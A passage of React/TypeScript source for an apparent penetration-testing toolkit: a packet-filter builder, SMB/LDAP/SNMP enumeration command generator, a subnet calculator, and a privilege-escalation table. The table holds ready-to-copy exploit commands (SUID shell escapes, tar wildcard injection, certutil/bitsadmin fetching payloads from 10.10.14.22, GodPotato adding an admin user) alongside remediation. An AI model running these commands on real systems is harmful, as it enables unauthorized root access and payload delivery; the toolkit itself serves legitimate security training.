      wsParts.push(`ip.src == ${srcIp.trim()}`);
      bpfParts.push(srcIp.includes("/") ? `src net ${srcIp.trim()}` : `src host ${srcIp.trim()}`);
    }
    if (dstIp.trim()) {
      wsParts.push(`ip.dst == ${dstIp.trim()}`);
      bpfParts.push(dstIp.includes("/") ? `dst net ${dstIp.trim()}` : `dst host ${dstIp.trim()}`);
    }

    // Port
    if (port.trim() && protocol !== "ARP" && protocol !== "ICMP") {
      const p = port.trim();
      wsParts.push(`${protocol === "UDP" ? "udp" : "tcp"}.port == ${p}`);
      bpfParts.push(`port ${p}`);
    }

    // TCP Flags
    if (protocol === "TCP" || protocol === "HTTP" || protocol === "TLS") {
      const activeFlags = Object.entries(flags)
        .filter(([, v]) => v)
        .map(([k]) => k);
      if (activeFlags.length > 0) {
        activeFlags.forEach((fl) => wsParts.push(`tcp.flags.${fl.toLowerCase()} == 1`));
        const bpfFlagExpr = activeFlags.map((fl) => `tcp-${fl.toLowerCase()}`).join("|");
        bpfParts.push(`(tcp[tcpflags] & (${bpfFlagExpr}) != 0)`);
      }
    }

    // HTTP Method / Status
    if (protocol === "HTTP") {
      if (httpMethod !== "ANY") {
        wsParts.push(`http.request.method == "${httpMethod}"`);
      }
      if (httpStatus.trim()) {
        wsParts.push(`http.response.code == ${httpStatus.trim()}`);
      }
    }

    // Payload contains
    if (payloadContains.trim()) {
      wsParts.push(`frame contains "${payloadContains.trim()}"`);
    }

    // Exclude SSH/RDP noise
    if (excludeNoise) {
      wsParts.push(`!(tcp.port == 22 || tcp.port == 3389)`);
      bpfParts.push(`not port 22 and not port 3389`);
    }

    const ws = wsParts.join(" && ");
    const bpf = `sudo tcpdump -i any -nn -v -s0 '${bpfParts.join(" and ")}'${
      payloadContains.trim() ? ` -A | grep -i --color "${payloadContains.trim()}"` : " -w capture.pcap"
    }`;

    return { wiresharkFilter: ws, tcpdumpCmd: bpf };
  }, [srcIp, dstIp, port, protocol, flags, httpMethod, httpStatus, payloadContains, excludeNoise]);

  useEffect(() => {
    setOutput(
      `# Wireshark Display Filter\n${wiresharkFilter}\n\n# tcpdump BPF CLI Command\n${tcpdumpCmd}`
    );
  }, [wiresharkFilter, tcpdumpCmd, setOutput]);

  return (
    <div className="space-y-5">
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
            Source IP / CIDR
          </label>
          <input
            type="text"
            value={srcIp}
            onChange={(e) => setSrcIp(e.target.value)}
            placeholder="10.10.14.22"
            className="w-full rounded-xs border border-border bg-background px-3 py-2 text-sm font-mono-code text-text"
          />
        </div>
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
            Destination IP / CIDR
          </label>
          <input
            type="text"
            value={dstIp}
            onChange={(e) => setDstIp(e.target.value)}
            placeholder="192.168.1.0/24"
            className="w-full rounded-xs border border-border bg-background px-3 py-2 text-sm font-mono-code text-text"
          />
        </div>
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
            Port Number
          </label>
          <input
            type="text"
            value={port}
            onChange={(e) => setPort(e.target.value)}
            placeholder="443"
            className="w-full rounded-xs border border-border bg-background px-3 py-2 text-sm font-mono-code text-text"
          />
        </div>
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
            Protocol
          </label>
          <select
            value={protocol}
            onChange={(e) => setProtocol(e.target.value as typeof protocol)}
            className="w-full rounded-xs border border-border bg-background px-3 py-2 text-sm text-text"
          >
            {(["TCP", "UDP", "HTTP", "DNS", "TLS", "ARP", "ICMP"] as const).map((p) => (
              <option key={p} value={p}>
                {p}
              </option>
            ))}
          </select>
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
            TCP Header Flags
          </label>
          <div className="flex flex-wrap gap-1.5">
            {Object.keys(flags).map((fl) => (
              <button
                key={fl}
                type="button"
                onClick={() => toggleFlag(fl)}
                className={`rounded-xs border px-2.5 py-1.5 font-mono-code text-xs font-bold cursor-pointer transition ${
                  flags[fl]
                    ? "border-accent bg-[#ff6a00] text-white"
                    : "border-border bg-background text-text-muted"
                }`}
              >
                {fl}
              </button>
            ))}
          </div>
        </div>

        <div className="grid grid-cols-2 gap-2">
          <div>
            <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
              HTTP Method
            </label>
            <select
              value={httpMethod}
              onChange={(e) => setHttpMethod(e.target.value)}
              className="w-full rounded-xs border border-border bg-background px-2.5 py-2 text-xs font-mono-code text-text"
            >
              <option value="ANY">ANY</option>
              <option value="GET">GET</option>
              <option value="POST">POST</option>
              <option value="PUT">PUT</option>
              <option value="DELETE">DELETE</option>
            </select>
          </div>
          <div>
            <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
              HTTP Status
            </label>
            <input
              type="text"
              value={httpStatus}
              onChange={(e) => setHttpStatus(e.target.value)}
              placeholder="200"
              className="w-full rounded-xs border border-border bg-background px-2.5 py-2 text-xs font-mono-code text-text"
            />
          </div>
        </div>

        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
            Payload Contains String
          </label>
          <input
            type="text"
            value={payloadContains}
            onChange={(e) => setPayloadContains(e.target.value)}
            placeholder="password / Bearer"
            className="w-full rounded-xs border border-border bg-background px-3 py-2 text-xs font-mono-code text-text"
          />
        </div>
      </div>

      <label className="inline-flex items-center gap-2 text-xs text-text cursor-pointer">
        <input
          type="checkbox"
          checked={excludeNoise}
          onChange={(e) => setExcludeNoise(e.target.checked)}
          className="accent-[#ff6a00]"
        />
        Exclude SSH (Port 22) & RDP (Port 3389) Management Traffic Noise
      </label>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        <div className="rounded-xs border border-border bg-[#121212] p-4 text-white space-y-2">
          <div className="flex items-center justify-between">
            <span className="font-heading text-xs font-bold uppercase tracking-wider text-[#ff6a00]">
              Wireshark Display Filter
            </span>
            <InlineCopyButton text={wiresharkFilter} />
          </div>
          <pre className="font-mono-code text-xs text-emerald-400 overflow-x-auto whitespace-pre-wrap break-all">
            {wiresharkFilter}
          </pre>
        </div>

        <div className="rounded-xs border border-border bg-[#121212] p-4 text-white space-y-2">
          <div className="flex items-center justify-between">
            <span className="font-heading text-xs font-bold uppercase tracking-wider text-[#ff6a00]">
              tcpdump BPF CLI Command
            </span>
            <InlineCopyButton text={tcpdumpCmd} />
          </div>
          <pre className="font-mono-code text-xs text-amber-300 overflow-x-auto whitespace-pre-wrap break-all">
            $ {tcpdumpCmd}
          </pre>
        </div>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 5. SMB / SNMP / LDAP / NFS ENUMERATION BUILDER
 * ========================================================================== */
function SmbSnmpLdapEnumerationBuilder({ tool }: { tool: Tool }) {
  const { setOutput } = useToolCard();
  const [targetIp, setTargetIp] = useState("10.10.11.152");
  const [domain, setDomain] = useState("corp.local");
  const [username, setUsername] = useState("svc_backup");
  const [password, setPassword] = useState("Winter2026!");
  const [nullSession, setNullSession] = useState(false);

  const ip = targetIp.trim() || "10.10.11.152";
  const dom = domain.trim() || "corp.local";
  const baseDn = dom
    .split(".")
    .filter(Boolean)
    .map((part) => `DC=${part}`)
    .join(",");

  const sections = useMemo(() => {
    const u = nullSession ? "" : username.trim();
    const p = nullSession ? "" : password.trim();

    return [
      {
        title: "SMB / NetBIOS / RPC Enumeration (Ports 139, 445)",
        commands: [
          {
            tool: "smbclient",
            cmd: nullSession
              ? `smbclient -N -L //${ip}`
              : `smbclient -U '${dom}\\${u}%${p}' -L //${ip}`,
          },
          {
            tool: "rpcclient",
            cmd: nullSession
              ? `rpcclient -U "" -N ${ip} -c "enumdomusers; enumdomgroups; querydominfo"`
              : `rpcclient -U '${dom}/${u}%${p}' ${ip} -c "enumdomusers; enumdomgroups"`,
          },
          {
            tool: "enum4linux-ng",
            cmd: nullSession
              ? `enum4linux-ng -A ${ip}`
              : `enum4linux-ng -A -u '${u}' -p '${p}' -d '${dom}' ${ip}`,
          },
          {
            tool: "netexec smb",
            cmd: nullSession
              ? `netexec smb ${ip} -u '' -p '' --shares --users --pass-pol`
              : `netexec smb ${ip} -d '${dom}' -u '${u}' -p '${p}' --shares --users --loggedon-users`,
          },
        ],
      },
      {
        title: "SNMP MIB & OID Walking (UDP Port 161)",
        commands: [
          {
            tool: "snmpwalk v2c (Full MIB Tree)",
            cmd: `snmpwalk -v2c -c public ${ip} 1.3.6.1.2.1`,
          },
          {
            tool: "snmpwalk (Windows Users OID)",
            cmd: `snmpwalk -v2c -c public ${ip} 1.3.6.1.4.1.77.1.2.25`,
          },
          {
            tool: "snmpwalk (Linux/Win Running Processes OID)",
            cmd: `snmpwalk -v2c -c public ${ip} 1.3.6.1.2.1.25.4.2.1.2`,
          },
          {
            tool: "snmpwalk v3 (Authenticated SHA/AES)",
            cmd: `snmpwalk -v3 -l authPriv -u '${u || "snmpadmin"}' -a SHA -A '${p || "AuthPass123!"}' -x AES -X '${p || "PrivPass123!"}' ${ip}`,
          },
        ],
      },
      {
        title: `Active Directory LDAP Enumeration (Ports 389, 636 | ${baseDn})`,
        commands: [
          {
            tool: "ldapsearch (Dump Users & SPNs)",
            cmd: nullSession
              ? `ldapsearch -x -H ldap://${ip} -b "${baseDn}" "(objectClass=user)" sAMAccountName servicePrincipalName description`
              : `ldapsearch -x -H ldap://${ip} -D "${u}@${dom}" -w '${p}' -b "${baseDn}" "(objectClass=user)" sAMAccountName servicePrincipalName memberOf`,
          },
          {
            tool: "windapsearch (Privileged AD Objects)",
            cmd: nullSession
              ? `windapsearch -d ${dom} --dc-ip ${ip} -U --da --unconstrained-users`
              : `windapsearch -d ${dom} --dc-ip ${ip} -u '${u}@${dom}' -p '${p}' -U --da --spn --unconstrained-users`,
          },
        ],
      },
      {
        title: "NFS & SunRPC Portmapper Enumeration (Ports 111, 2049)",
        commands: [
          {
            tool: "showmount -e (Exported NFS Shares)",
            cmd: `showmount -e ${ip}`,
          },
          {
            tool: "rpcinfo (Registered RPC Programs)",
            cmd: `rpcinfo -p ${ip}`,
          },
          {
            tool: "mount NFSv3 (Inspect no_root_squash)",
            cmd: `sudo mkdir -p /mnt/nfs_audit && sudo mount -t nfs -o vers=3,nolock ${ip}:/ /mnt/nfs_audit`,
          },
        ],
      },
    ];
  }, [ip, dom, baseDn, username, password, nullSession]);

  useEffect(() => {
    const out = sections
      .map(
        (sec) =>
          `# ${sec.title}\n` +
          sec.commands.map((c) => `## ${c.tool}\n${c.cmd}`).join("\n\n")
      )
      .join("\n\n");
    setOutput(out);
  }, [sections, setOutput]);

  return (
    <div className="space-y-5">
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
            Target IP / Host
          </label>
          <input
            type="text"
            value={targetIp}
            onChange={(e) => setTargetIp(e.target.value)}
            className="w-full rounded-xs border border-border bg-background px-3 py-2 text-sm font-mono-code text-text"
          />
        </div>
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
            AD Domain Name
          </label>
          <input
            type="text"
            value={domain}
            onChange={(e) => setDomain(e.target.value)}
            className="w-full rounded-xs border border-border bg-background px-3 py-2 text-sm font-mono-code text-text"
          />
        </div>
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
            Username
          </label>
          <input
            type="text"
            disabled={nullSession}
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            className="w-full rounded-xs border border-border bg-background px-3 py-2 text-sm font-mono-code text-text disabled:opacity-40"
          />
        </div>
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
            Password / Hash
          </label>
          <input
            type="text"
            disabled={nullSession}
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full rounded-xs border border-border bg-background px-3 py-2 text-sm font-mono-code text-text disabled:opacity-40"
          />
        </div>
      </div>

      <label className="inline-flex items-center gap-2 text-xs text-text cursor-pointer">
        <input
          type="checkbox"
          checked={nullSession}
          onChange={(e) => setNullSession(e.target.checked)}
          className="accent-[#ff6a00]"
        />
        Use Unauthenticated Null Session / Anonymous Bind (`-N` / `-U &quot;&quot;`)
      </label>

      <div className="space-y-4">
        {sections.map((sec) => (
          <div key={sec.title} className="rounded-xs border border-border bg-background p-3.5 space-y-2.5">
            <h4 className="font-heading text-xs font-bold uppercase tracking-wider text-accent">
              {sec.title}
            </h4>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-2.5">
              {sec.commands.map((c) => (
                <div key={c.tool} className="rounded-xs bg-[#121212] p-3 text-white space-y-1.5">
                  <div className="flex items-center justify-between">
                    <span className="font-heading text-[11px] font-bold uppercase tracking-wider text-gray-300">
                      {c.tool}
                    </span>
                    <InlineCopyButton text={c.cmd} />
                  </div>
                  <pre className="font-mono-code text-xs text-emerald-400 overflow-x-auto whitespace-pre-wrap break-all">
                    $ {c.cmd}
                  </pre>
                </div>
              ))}
            </div>
          </div>
        ))}
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 6. LINUX & WINDOWS PRIVILEGE ESCALATION CHECKLIST
 * ========================================================================== */
interface PrivescEntry {
  binary: string;
  os: "linux" | "windows";
  context: string;
  checkCmd: string;
  exploitCmd: string;
  remediation: string;
}

const PRIVESC_DB: PrivescEntry[] = [
  {
    binary: "find",
    os: "linux",
    context: "SUID",
    checkCmd: "find / -perm -4000 -type f 2>/dev/null",
    exploitCmd: "find . -exec /bin/sh -p \\; -quit",
    remediation: "sudo chmod u-s $(which find) && remove NOPASSWD sudoers entries for find",
  },
  {
    binary: "vim",
    os: "linux",
    context: "sudo",
    checkCmd: "sudo -l",
    exploitCmd: "sudo vim -c ':!/bin/bash'",
    remediation: "Use sudoedit instead of granting sudo access to full vim binary; set NOEXEC in sudoers",
  },
  {
    binary: "python3",
    os: "linux",
    context: "Capabilities",
    checkCmd: "getcap -r / 2>/dev/null",
    exploitCmd: "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash -p\")'",
    remediation: "sudo setcap -r $(readlink -f $(which python3))",
  },
  {
    binary: "tar",
    os: "linux",
    context: "Cron",
    checkCmd: "cat /etc/crontab && ls -la /var/backups",
    exploitCmd: "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh && touch './--checkpoint=1' './--checkpoint-action=exec=sh shell.sh'",
    remediation: "Avoid wildcard (*) expansion in root cron tar jobs; specify explicit full paths",
  },
  {
    binary: "bash",
    os: "linux",
    context: "SUID",
    checkCmd: "ls -la /bin/bash",
    exploitCmd: "/bin/bash -p",
    remediation: "sudo chmod u-s /bin/bash",
  },
  {
    binary: "docker",
    os: "linux",
    context: "sudo",
    checkCmd: "id && groups",
    exploitCmd: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    remediation: "Remove untrusted users from the docker group; enforce rootless Docker daemon",
  },
  {
    binary: "pkexec",
    os: "linux",
    context: "SUID",
    checkCmd: "pkexec --version",
    exploitCmd: "# CVE-2021-4034 (PwnKit): Check polkit version < 0.120 and audit GCONV_PATH environment handling",
    remediation: "Patch polkit package and strip SUID bit if local polkit elevation is unneeded: chmod 0755 /usr/bin/pkexec",
  },
  {
    binary: "certutil",
    os: "windows",
    context: "AlwaysInstallElevated",
    checkCmd: "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
    exploitCmd: "certutil.exe -urlcache -split -f http://10.10.14.22/priv.msi C:\\Temp\\priv.msi && msiexec /quiet /qn /i C:\\Temp\\priv.msi",
    remediation: "Disable AlwaysInstallElevated in HKLM & HKCU Group Policy and block outbound certutil URLCache via AppLocker/WDAC",
  },
  {
    binary: "bitsadmin",
    os: "windows",
    context: "Unquoted Service Path",
    checkCmd: "wmic service get name,displayname,pathname,startmode | findstr /i \"Auto\" | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v '\"'",
    exploitCmd: "bitsadmin /transfer stage /download /priority high http://10.10.14.22/Service.exe \"C:\\Program Files\\Vuln App\\Common.exe\" && sc stop VulnSvc && sc start VulnSvc",
    remediation: "Wrap all Windows service ImagePath registry values containing spaces in double quotes and restrict folder ACLs (icacls)",
  },
  {
    binary: "PrintSpoofer",
    os: "windows",
    context: "SeImpersonatePrivilege",
    checkCmd: "whoami /priv",
    exploitCmd: "PrintSpoofer64.exe -i -c \"cmd.exe\"",
    remediation: "Disable Print Spooler service on servers where unneeded and restrict service account token privileges",
  },
  {
    binary: "GodPotato",
    os: "windows",
    context: "SeImpersonatePrivilege",
    checkCmd: "whoami /priv | findstr /i \"SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege\"",
    exploitCmd: "GodPotato-NET4.exe -cmd \"cmd /c net user audit_admin P@ssw0rd2026! /add && net localgroup administrators audit_admin /add\"",
    remediation: "Isolate IIS AppPool / SQL service accounts using Group Managed Service Accounts (gMSA) and enforce least privilege",
  },
];

function LinuxWindowsPrivescChecklist({ tool }: { tool: Tool }) {
  const { setOutput } = useToolCard();
  const [tab, setTab] = useState<"linux" | "windows">("linux");
  const [search, setSearch] = useState("");
  const [contextFilter, setContextFilter] = useState("All");
  const [selectedBinary, setSelectedBinary] = useState<string>("find");

  const contexts = [
    "All",
    "sudo",
    "SUID",
    "Capabilities",
    "Cron",
    "SeImpersonatePrivilege",
    "Unquoted Service Path",
    "AlwaysInstallElevated",
  ];

  const filtered = useMemo(() => {
    return PRIVESC_DB.filter((item) => {
      const matchTab = item.os === tab;
      const matchContext = contextFilter === "All" || item.context === contextFilter;
      const matchSearch =
        !search.trim() ||
        item.binary.toLowerCase().includes(search.toLowerCase()) ||
        item.context.toLowerCase().includes(search.toLowerCase());
      return matchTab || contextFilter !== "All" ? (contextFilter !== "All" ? matchContext : matchTab) && matchSearch : false;
    });
  }, [tab, contextFilter, search]);

  const activeEntry = useMemo(
    () => PRIVESC_DB.find((b) => b.binary === selectedBinary) || filtered[0] || PRIVESC_DB[0],
    [selectedBinary, filtered]
  );

  useEffect(() => {
    setOutput(
      `# Privilege Escalation Vector: ${activeEntry.binary} (${activeEntry.context})\n\n## 1. Enumeration / Verification Command\n${activeEntry.checkCmd}\n\n## 2. Exploitation Command\n${activeEntry.exploitCmd}\n\n## 3. Hardening & Remediation\n${activeEntry.remediation}`
    );
  }, [activeEntry, setOutput]);

  return (
    <div className="space-y-5">
      <div className="flex flex-wrap items-center justify-between gap-3 border-b border-border pb-3">
        <div className="flex gap-2">
          <button
            type="button"
            onClick={() => {
              setTab("linux");
              setContextFilter("All");
              setSelectedBinary("find");
            }}
            className={`rounded-xs px-4 py-2 font-heading text-xs font-bold uppercase tracking-wider cursor-pointer transition ${
              tab === "linux"
                ? "bg-[#ff6a00] text-white"
                : "border border-border bg-background text-text-muted"
            }`}
          >
            Linux GTFOBins & SUID
          </button>
          <button
            type="button"
            onClick={() => {
              setTab("windows");
              setContextFilter("All");
              setSelectedBinary("PrintSpoofer");
            }}
            className={`rounded-xs px-4 py-2 font-heading text-xs font-bold uppercase tracking-wider cursor-pointer transition ${
              tab === "windows"
                ? "bg-[#ff6a00] text-white"
                : "border border-border bg-background text-text-muted"
            }`}
          >
            Windows LOLBAS & Token Privs
          </button>
        </div>

        <input
          type="text"
          value={search}
          onChange={(e) => setSearch(e.target.value)}
          placeholder="Search binary (find, pkexec, GodPotato...)"
          className="rounded-xs border border-border bg-background px-3 py-1.5 text-xs font-mono-code text-text"
        />
      </div>

      {/* Context Selector */}
      <div className="flex flex-wrap gap-1.5">
        {contexts.map((ctx) => (
          <button
            key={ctx}
            type="button"
            onClick={() => setContextFilter(ctx)}
            className={`rounded-xs border px-2.5 py-1 font-heading text-[11px] font-semibold uppercase cursor-pointer transition ${
              contextFilter === ctx
                ? "border-accent bg-[#ff6a00]/15 text-accent"
                : "border-border bg-background text-text-muted hover:text-text"
            }`}
          >
            {ctx}
          </button>
        ))}
      </div>

      {/* Binary Selector Pills */}
      <div className="flex flex-wrap gap-2">
        {filtered.map((item) => (
          <button
            key={item.binary}
            type="button"
            onClick={() => setSelectedBinary(item.binary)}
            className={`rounded-xs border px-3 py-2 font-mono-code text-xs font-bold cursor-pointer transition ${
              activeEntry.binary === item.binary
                ? "border-accent bg-[#ff6a00] text-white"
                : "border-border bg-background text-text hover:border-accent"
            }`}
          >
            {item.binary}{" "}
            <span className="opacity-75 text-[10px]">[{item.context}]</span>
          </button>
        ))}
      </div>

      {/* Selected Binary Details */}
      <div className="rounded-xs border border-border bg-[#121212] p-4 text-white space-y-3">
        <div className="flex items-center justify-between">
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-[#ff6a00]">
            Selected Vector: {activeEntry.binary} ({activeEntry.context})
          </span>
          <InlineCopyButton text={activeEntry.exploitCmd} label="Copy Exploit" />
        </div>

        <div>
          <span className="block text-[11px] font-heading uppercase text-gray-400 mb-1">
            Enumeration / Discovery Check
          </span>
          <pre className="rounded-xs bg-black/50 p-2.5 font-mono-code text-xs text-amber-300 overflow-x-auto">
            $ {activeEntry.checkCmd}
          </pre>
        </div>

        <div>
          <span className="block text-[11px] font-heading uppercase text-gray-400 mb-1">
            Privilege Escalation Payload
          </span>
          <pre className="rounded-xs bg-black/50 p-2.5 font-mono-code text-xs text-emerald-400 overflow-x-auto whitespace-pre-wrap break-all">
            $ {activeEntry.exploitCmd}
          </pre>
        </div>

        <div>
          <span className="block text-[11px] font-heading uppercase text-gray-400 mb-1">
            Defensive Remediation
          </span>
          <p className="font-mono-code text-xs text-sky-300">{activeEntry.remediation}</p>
        </div>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 7. IPv4 / IPv6 CIDR SUBNET & VLSM CALCULATOR
 * ========================================================================== */
function Ipv4Ipv6CidrSubnetVlsmCalculator({ tool }: { tool: Tool }) {
  const { setOutput } = useToolCard();
  const [ipInput, setIpInput] = useState("192.168.1.0");
  const [cidr, setCidr] = useState(24);
  const [ipv6Prefix, setIpv6Prefix] = useState(64);
  const [vlsmSplits, setVlsmSplits] = useState(4);

  const calc = useMemo(() => {
    const octets = ipInput
      .trim()
      .split(".")
      .map((n) => Math.min(255, Math.max(0, parseInt(n, 10) || 0)));
    while (octets.length < 4) octets.push(0);

    const ipInt =
      ((octets[0] << 24) >>> 0) +
      ((octets[1] << 16) >>> 0) +
      ((octets[2] << 8) >>> 0) +
      (octets[3] >>> 0);

    const maskInt = cidr === 0 ? 0 : (0xffffffff << (32 - cidr)) >>> 0;
    const wildcardInt = (~maskInt) >>> 0;
    const netInt = (ipInt & maskInt) >>> 0;
    const bcastInt = (netInt | wildcardInt) >>> 0;

    const intToIp = (n: number) =>
      [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255].join(".");

    const firstHost = cidr >= 31 ? intToIp(netInt) : intToIp((netInt + 1) >>> 0);
    const lastHost = cidr >= 31 ? intToIp(bcastInt) : intToIp((bcastInt - 1) >>> 0);
    const usableHosts =
      cidr === 32 ? 1 : cidr === 31 ? 2 : Math.max(0, Math.pow(2, 32 - cidr) - 2);

    const isPrivate =
      octets[0] === 10 ||
      (octets[0] === 172 && octets[1] >= 16 && octets[1] <= 31) ||
      (octets[0] === 192 && octets[1] === 168);
    const ipClass =
      octets[0] < 128
        ? "Class A"
        : octets[0] < 192
        ? "Class B"
        : octets[0] < 224
        ? "Class C"
        : "Class D/E (Multicast/Reserved)";

    const binary32 = [
      ((ipInt >>> 24) & 255).toString(2).padStart(8, "0"),
      ((ipInt >>> 16) & 255).toString(2).padStart(8, "0"),
      ((ipInt >>> 8) & 255).toString(2).padStart(8, "0"),
      (ipInt & 255).toString(2).padStart(8, "0"),
    ].join(".");

    // VLSM Subnets
    const extraBits = Math.round(Math.log2(vlsmSplits));
    const childCidr = Math.min(32, cidr + extraBits);
    const childBlockSize = Math.pow(2, 32 - childCidr);
    const vlsmList: { subnet: string; range: string; broadcast: string; hosts: number }[] = [];
    for (let i = 0; i < vlsmSplits && childCidr <= 32; i++) {
      const subNetInt = (netInt + i * childBlockSize) >>> 0;
      const subBcastInt = (subNetInt + childBlockSize - 1) >>> 0;
      vlsmList.push({
        subnet: `${intToIp(subNetInt)}/${childCidr}`,
        range:
          childCidr >= 31
            ? `${intToIp(subNetInt)} - ${intToIp(subBcastInt)}`
            : `${intToIp((subNetInt + 1) >>> 0)} - ${intToIp((subBcastInt - 1) >>> 0)}`,
        broadcast: intToIp(subBcastInt),
        hosts: childCidr >= 31 ? (childCidr === 32 ? 1 : 2) : Math.max(0, childBlockSize - 2),
      });
    }

    return {
      network: intToIp(netInt),
      broadcast: intToIp(bcastInt),
      firstHost,
      lastHost,
      usableHosts,
      subnetMask: intToIp(maskInt),
      wildcardMask: intToIp(wildcardInt),
      scope: `${ipClass} • ${isPrivate ? "RFC 1918 Private" : "Public Routable"}`,
      binary32,
      vlsmList,
      ipv6Subnets: ipv6Prefix <= 64 ? `2^${64 - ipv6Prefix} (/64 LANs)` : `2^${128 - ipv6Prefix} Interface IDs`,
    };
  }, [ipInput, cidr, vlsmSplits, ipv6Prefix]);

  useEffect(() => {
    setOutput(
      `# IPv4 CIDR Subnet Calculation (${ipInput}/${cidr})\nNetwork Address : ${calc.network}/${cidr}\nBroadcast Addr  : ${calc.broadcast}\nUsable Range    : ${calc.firstHost} - ${calc.lastHost}\nTotal Hosts     : ${calc.usableHosts.toLocaleString()}\nSubnet Mask     : ${calc.subnetMask}\nWildcard Mask   : ${calc.wildcardMask}\nIP Scope        : ${calc.scope}\n32-Bit Binary   : ${calc.binary32}`
    );
  }, [ipInput, cidr, calc, setOutput]);

  return (
    <div className="space-y-5">
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
            IPv4 Address
          </label>
          <input
            type="text"
            value={ipInput}
            onChange={(e) => setIpInput(e.target.value)}
            className="w-full rounded-xs border border-border bg-background px-3 py-2 text-sm font-mono-code text-text"
          />
        </div>

        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
            IPv4 CIDR Prefix: /{cidr} ({calc.subnetMask})
          </label>
          <input
            type="range"
            min={1}
            max={32}
            value={cidr}
            onChange={(e) => setCidr(Number(e.target.value))}
            className="w-full accent-[#ff6a00]"
          />
        </div>

        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1.5">
            IPv6 Prefix Preview: /{ipv6Prefix} ({calc.ipv6Subnets})
          </label>
          <input
            type="range"
            min={48}
            max={128}
            step={4}
            value={ipv6Prefix}
            onChange={(e) => setIpv6Prefix(Number(e.target.value))}
            className="w-full accent-[#ff6a00]"
          />
        </div>
      </div>

      {/* Metrics Grid */}
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
        {[
          { label: "Network Address", val: `${calc.network}/${cidr}` },
          { label: "Broadcast Address", val: calc.broadcast },
          { label: "First Usable Host", val: calc.firstHost },
          { label: "Last Usable Host", val: calc.lastHost },
          { label: "Total Usable Hosts", val: calc.usableHosts.toLocaleString() },
          { label: "Subnet Mask", val: calc.subnetMask },
          { label: "Cisco Wildcard Mask", val: calc.wildcardMask },
          { label: "IP Class & Scope", val: calc.scope },
        ].map((m) => (
          <div key={m.label} className="rounded-xs border border-border bg-background p-3">
            <span className="block font-heading text-[10px] font-bold uppercase tracking-wider text-text-muted">
              {m.label}
            </span>
            <span className="mt-1 block font-mono-code text-xs font-bold text-text">{m.val}</span>
          </div>
        ))}
      </div>

      {/* 32-Bit Binary Visualization */}
      <div className="rounded-xs border border-border bg-[#121212] p-3.5 text-white">
        <div className="flex items-center justify-between mb-1.5">
          <span className="font-heading text-[11px] font-bold uppercase tracking-wider text-[#ff6a00]">
            32-Bit Binary Boundary Visualization (Network Bits vs Host Bits)
          </span>
          <span className="font-mono-code text-[11px] text-gray-400">/{cidr} Boundary</span>
        </div>
        <div className="font-mono-code text-xs tracking-wider break-all">
          {(() => {
            let bitIndex = 0;
            return calc.binary32.split("").map((ch, idx) => {
              if (ch === ".") return <span key={idx} className="text-gray-500 mx-0.5">.</span>;
              bitIndex++;
              return (
                <span
                  key={idx}
                  className={bitIndex <= cidr ? "text-emerald-400 font-bold" : "text-amber-400"}
                >
                  {ch}
                </span>
              );
            });
          })()}
        </div>
      </div>

      {/* VLSM Subnet Splitter */}
      <div className="rounded-xs border border-border bg-background p-3.5 space-y-2.5">
        <div className="flex items-center justify-between">
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-text">
            VLSM Equal Subnet Splitter
          </span>
          <div className="flex gap-1.5">
            {[2, 4, 8].map((n) => (
              <button
                key={n}
                type="button"
                onClick={() => setVlsmSplits(n)}
                className={`rounded-xs border px-2.5 py-1 font-mono-code text-xs cursor-pointer ${
                  vlsmSplits === n
                    ? "border-accent bg-[#ff6a00] text-white font-bold"
                    : "border-border bg-surface text-text-muted"
                }`}
              >
                Split ×{n}
              </button>
            ))}
          </div>
        </div>

        <div className="overflow-x-auto">
          <table className="w-full text-left font-mono-code text-xs">
            <thead>
              <tr className="border-b border-border text-text-muted">
                <th className="py-1.5">Subnet Block</th>
                <th className="py-1.5">Usable Host Range</th>
                <th className="py-1.5">Broadcast</th>
                <th className="py-1.5">Usable Hosts</th>
              </tr>
            </thead>
            <tbody>
              {calc.vlsmList.map((row) => (
